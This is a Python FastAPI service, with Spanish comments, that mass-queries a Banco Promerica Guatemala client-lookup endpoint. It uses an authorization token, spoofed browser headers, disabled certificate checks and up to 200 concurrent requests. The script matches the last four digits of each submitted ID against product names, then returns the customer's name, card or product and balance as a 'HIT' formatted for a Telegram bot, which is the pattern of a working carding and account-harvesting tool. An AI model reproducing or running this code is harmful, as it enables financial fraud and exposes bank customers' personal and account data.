import sys
import asyncio
import json
import httpx
import os
import time
from typing import List
from fastapi import FastAPI, Body, Query
from colorama import init, Fore, Style
from dotenv import load_dotenv

load_dotenv()

# Inicializar colores
init(autoreset=True)

app = FastAPI()

# --- CONFIGURACIÓN DE LA API ---
MAX_GLOBAL = 200
TOKEN = os.getenv("PROMERICA_TOKEN", "")
if not TOKEN:
    raise ValueError("❌ PROMERICA_TOKEN no configurado en .env")

HEADERS = {
    "accept": "*/*",
    "authorization": TOKEN,
    "dirigido": "TkE=",
    "origin": "https://www.bancopromerica.com.gt",
    "referer": "https://www.bancopromerica.com.gt/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36"
}

@app.get("/status")
async def get_status():
    return {"status": "ONLINE", "hilos_max": MAX_GLOBAL, "engine": "HTTPX-ULTRA"}

async def consultar_id(client, id_target: str):
    # Extraemos los últimos 4 para el filtro
    ultimos_4_enviados = id_target[-4:]
    url = f"https://services.bancopromerica.com.gt/wscxopa/opa/GetClienteIdentificador/{id_target}/3"
    
    try:
        resp = await client.get(url, timeout=15.0)
        if resp.status_code == 200:
            data = resp.json()
            if data and "Informacion" in data and data["Informacion"]:
                info = data["Informacion"][0]
                productos = info.get("Productos", [])
                
                # --- FILTRO DE SEGURIDAD ---
                coincidencias = [p for p in productos if str(p.get('Nombre', '')).endswith(ultimos_4_enviados)]
                
                if not coincidencias:
                    return {"id": id_target, "tipo": "sin_datos"}

                nombre = f"{info.get('PrimerNombre', '')} {info.get('PrimerApellido', '')}".strip()
                
                # Formatear detalle para el bot de Telegram
                detalle = f"👤 Cliente: {nombre}\n"
                for c in coincidencias:
                    detalle += f"💳 {c.get('Nombre')}\n   - Saldo: Q{c.get('saldoAlDia')}\n"
                
                return {"id": id_target, "tipo": "valida", "detalle": detalle}
        
        return {"id": id_target, "tipo": "sin_datos"}
    except Exception as e:
        return {"id": id_target, "tipo": "error", "msg": str(e)}

@app.post("/consultar_lote")
async def api_lote(ids: List[str] = Body(...), threads: int = Query(25)):
    concurrencia_real = min(threads, MAX_GLOBAL)
    total_ids = len(ids)
    resultados = []
    procesados = 0
    lock = asyncio.Lock()

    print(f"\n{Fore.MAGENTA}{'='*60}")
    print(f"{Fore.MAGENTA}🚀 HUNTER MIGRADO: {total_ids} IDs | HILOS: {concurrencia_real}")
    print(f"{Fore.MAGENTA}{'='*60}\n")

    # Usamos httpx.AsyncClient para máximo rendimiento
    async with httpx.AsyncClient(headers=HEADERS, verify=False) as client:
        semaphore = asyncio.Semaphore(concurrencia_real)
        
        async def task_worker(id_in):
            nonlocal procesados
            async with semaphore:
                res = await consultar_id(client, id_in)
                resultados.append(res)
                
                async with lock:
                    procesados += 1
                    if res['tipo'] == 'valida':
                        print(f"{Fore.GREEN}[{procesados}/{total_ids}] ID: {id_in} -> HIT ✅")
                    elif res['tipo'] == 'sin_datos':
                        print(f"{Fore.YELLOW}[{procesados}/{total_ids}] ID: {id_in} -> NO HIT ⚠️")
                    else:
                        print(f"{Fore.RED}[{procesados}/{total_ids}] ID: {id_in} -> ERROR ❌")
        
        await asyncio.gather(*(task_worker(i) for i in ids))
    
    return {"resultados": resultados}

if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PROMERICA_PORT", 5000))
    # Escuchar en 0.0.0.0 para aceptar conexiones remotas en VPS
    uvicorn.run(app, host="0.0.0.0", port=port)

